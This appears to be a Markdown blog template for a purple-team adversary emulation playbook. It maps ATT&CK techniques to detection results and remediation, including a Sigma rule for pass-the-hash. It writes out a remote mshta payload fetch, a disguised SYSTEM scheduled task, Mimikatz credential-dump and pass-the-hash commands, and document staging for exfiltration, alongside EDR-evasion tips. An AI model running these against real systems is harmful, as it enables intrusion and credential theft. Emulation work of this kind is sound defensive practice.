---
date: 2025-01-15
authors:
  - n1ghtfury
tags:
  - Adversary Emulation
  - Red Team
  - Purple Team
  - ATT&CK
  - OPSEC
  - C2
  - Lateral Movement
  - Privilege Escalation
  - Atomic Red Team
  - MITRE
  - Post-Exploitation
  - Cobalt Strike
categories:
  - Adversary Emulation
---

# [Threat Actor / TTP] — Adversary Emulation Playbook

Replace this with a 2–3 sentence summary. Describe the threat actor or TTP being emulated,
the exercise objective, and the key outcome for defenders. This appears on the blog index card.

<!-- more -->

!!! abstract "Emulation at a Glance"
    - **Target TTPs:** `TXXXX.XXX` · `TXXXX.XXX` · `TXXXX.XXX`
    - **Tactics Covered:** Initial Access → Execution → Persistence → Lateral Movement → Exfil
    - **Exercise Type:** Purple Team / Red Team / Breach Simulation
    - **Results:** X detections validated · Y gaps identified

---

## Emulation Objective

Describe the goal: red team exercise, purple team validation, specific TTP gap closure,
executive reporting, or compliance evidence.

!!! info "Scope & Authorization"
    This emulation was conducted under a signed Rules of Engagement document.
    All activities were performed in [isolated lab / production with SOC notification]
    with explicit written approval from [authorizing stakeholder].

---

## Threat Actor Overview

| Field | Value |
|-------|-------|
| Threat Actor | APT / FIN / UNC group (or "Generic TTP") |
| Motivation | Espionage / Financial / Disruption |
| Primary Tooling | Cobalt Strike / Sliver / Havoc / Custom |
| Target Sectors | Finance, Healthcare, Government, Energy |
| ATT&CK Group | [G00XX](https://attack.mitre.org/groups/G00XX/) |
| Reference Reports | Mandiant / CrowdStrike / CISA advisory |

---

## ATT&CK Coverage Map

| ATT&CK ID | Technique | Tactic | Detection Before | Detection After |
|-----------|-----------|--------|:---------------:|:---------------:|
| T1566.001 | Spearphishing Attachment | Initial Access | :octicons-x-circle-fill-16: Gap | :octicons-check-circle-fill-16: Covered |
| T1059.001 | PowerShell | Execution | :octicons-check-circle-fill-16: Covered | :octicons-check-circle-fill-16: Covered |
| T1053.005 | Scheduled Task | Persistence | :octicons-alert-fill-16: Partial | :octicons-check-circle-fill-16: Covered |
| T1550.002 | Pass-the-Hash | Lateral Movement | :octicons-x-circle-fill-16: Gap | :octicons-x-circle-fill-16: Gap |
| T1041 | Exfiltration over C2 | Exfiltration | :octicons-x-circle-fill-16: Gap | :octicons-alert-fill-16: Partial |

---

## Environment Setup

=== "Attacker Infrastructure"
    | Component | Tool | Notes |
    |-----------|------|-------|
    | C2 Framework | Cobalt Strike / Sliver / Havoc | |
    | Listener Profile | Malleable C2 | Mimics [Microsoft Update / Teams] traffic |
    | Redirector | Apache mod_rewrite on cloud VPS | |
    | Payload Format | Shellcode / Reflective DLL / EXE | |

=== "Target Environment"
    | Component | Value |
    |-----------|-------|
    | OS | Windows Server 2022 / Windows 11 |
    | Domain | lab.local |
    | EDR | CrowdStrike / Defender / Elastic |
    | SIEM | Elastic / Splunk / Sentinel |
    | Logging | Sysmon + WEF + full network capture |

=== "Network Topology"
    ```
    [Internet]
        │
    [Redirector — cloud VPS]
        │ HTTPS/443
    [C2 Team Server]
        │
    ┌───┴──────────────────────┐
    │  Target Environment      │
    │  WORKSTATION-01          │
    │  FILE-SERVER-01          │
    │  DC-01                   │
    └──────────────────────────┘
    ```

---

## Pre-Emulation Checklist

- [ ] Rules of Engagement signed by [authorizing stakeholder]
- [ ] Scope documented: in-scope IPs, users, systems, time window
- [ ] Blue Team notified (purple team) or kept dark (red team)
- [ ] Logging confirmed active: EDR, SIEM, network sensors
- [ ] Environment snapshot / rollback plan in place
- [ ] Out-of-band communication channel established (Signal / encrypted chat)
- [ ] Emergency stop procedure agreed and documented

---

## Phase 1 — Initial Access

### T1566.001 — Spearphishing Attachment

**Objective:** Deliver payload to a targeted inbox and achieve execution on first click.

```powershell
# Example: macro-enabled document delivering staged payload via mshta
# Run in isolated lab only — replace with actual technique
mshta.exe http://[redirector]/payload.hta
```

!!! warning "OPSEC"
    - Use a ==malleable C2 profile== mimicking legitimate software (Teams, OneDrive, Zoom)
    - Stage payload from a categorized, aged domain to bypass web filtering
    - Avoid default Cobalt Strike / Sliver profiles — heavily signatured by all major EDRs

**Detection validation:**

| Control | Expected Alert | Result | Notes |
|---------|---------------|--------|-------|
| Email Gateway | Attachment blocked by sandbox | Pass / Fail | |
| EDR | Suspicious child process spawned | Pass / Fail | |
| SIEM | Rare process execution alert | Pass / Fail | |

---

## Phase 2 — Execution & Persistence

### T1053.005 — Scheduled Task

**Objective:** Survive reboot and re-establish C2 after system restart.

```cmd
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\svc.exe" /sc onlogon /ru SYSTEM /f
```

**Atomic Red Team equivalent:**

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1053.005 -TestNumbers 1
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup
```

---

## Phase 3 — Discovery & Credential Access

### T1087.002 — Domain Account Enumeration

```cmd
net user /domain
net group "Domain Admins" /domain
nltest /domain_trusts
```

### T1003.001 — LSASS Credential Dump

```powershell
# Requires SYSTEM or SeDebugPrivilege — use in lab only
# This WILL trigger on most modern EDRs
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

!!! danger "High-Detection Technique"
    LSASS access is heavily signatured. This step is included **to confirm detection fires**.
    If no alert triggers, that is the finding — not the success.

---

## Phase 4 — Lateral Movement

### T1550.002 — Pass-the-Hash

```cmd
# Using harvested NTLM hash to authenticate as Administrator on DC-01
.\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:[HASH] /run:cmd.exe"
```

---

## Phase 5 — Actions on Objective

```powershell
# Data staging example
Compress-Archive -Path "C:\Users\*\Documents\*" -DestinationPath "C:\Windows\Temp\archive.zip"

# Exfiltrate via C2 channel or DNS tunneling
```

---

## Detection Validation Results

| Phase | TTP | Alert Expected | Fired | Fidelity | Notes |
|-------|-----|----------------|:-----:|----------|-------|
| Initial Access | T1566.001 | Phishing alert | Yes | High | Fired in 45 seconds |
| Execution | T1059.001 | Suspicious PowerShell | Yes | Medium | 3 FPs also triggered |
| Persistence | T1053.005 | Scheduled task | **No** | — | Log source not enabled |
| Cred Access | T1003.001 | LSASS access | Yes | High | PPL not enabled — fired |
| Lateral Movement | T1550.002 | Pass-the-Hash | **No** | — | **Critical detection gap** |
| Exfiltration | T1041 | Data over C2 | Partial | Low | Needs TLS inspection |

---

## Findings

### Working Detections

!!! success "Validated Coverage"
    List TTPs where detections fired with expected fidelity and acceptable noise level.

### Detection Gaps — Prioritized

!!! danger "Coverage Gaps"
    Ranked by attacker advantage and potential blast radius:

    1. **T1550.002 Pass-the-Hash** — No detection. Any host reachable from the compromised machine is exploitable with harvested credentials.
    2. **T1053.005 Scheduled Task** — Security EID 4698 logging disabled. Persistence survives reboots undetected.

### OPSEC Findings

!!! info "What Worked for the Attacker"
    Document which OPSEC techniques successfully evaded existing controls,
    so the Blue Team can address the root capability gap.

---

## Remediation Roadmap

| Priority | Gap | Fix | Owner | ETA |
|----------|-----|-----|-------|-----|
| Critical | No PtH detection | Build KQL + Sigma rule for NTLM Type 3 | Detection Eng | 1 week |
| High | EID 4698 not logged | Enable via GPO: `Audit Other Object Access Events` | IT Ops | 2 weeks |
| High | LSASS not PPL-protected | Enable Credential Guard via WDAC policy | IT Ops | 1 month |
| Medium | No TLS inspection | Deploy SSL inspection at forward proxy | Arch | 1 quarter |

### Detection Rule to Build

```yaml
title: Pass-the-Hash — NTLM Type 3 Logon Without Prior TGT
id: 00000000-0000-0000-0000-000000000000
status: experimental
description: Detects lateral movement via Pass-the-Hash by correlating NTLM Type 3 logon without a preceding Kerberos TGT request
author: N1ghtFury
date: YYYY-MM-DD
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
  filter_local:
    IpAddress: '127.0.0.1'
  condition: selection and not filter_local
falsepositives:
  - Legacy NTLM authentication in environments without Kerberos enforcement
level: medium
tags:
  - attack.lateral_movement
  - attack.t1550.002
```

---

## Post-Emulation Report Structure

```markdown
EXECUTIVE SUMMARY (1 page)
  Exercise Type: Purple Team
  Date: YYYY-MM-DD | Authorized by: [Name, Title]
  Result: X of Y TTPs detected | Z critical gaps | Risk: HIGH

TECHNICAL FINDINGS (main body)
  Per-phase: evidence screenshots + log excerpts + timeline

REMEDIATION ROADMAP
  Priority 1 — Critical (fix within 1 week): ...
  Priority 2 — High (fix within 1 month): ...
  Priority 3 — Medium (fix within 1 quarter): ...
```

---

## References

- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [SCYTHE Community Threats](https://github.com/scythe-io/community-threats)
- [MITRE CALDERA](https://caldera.mitre.org/)
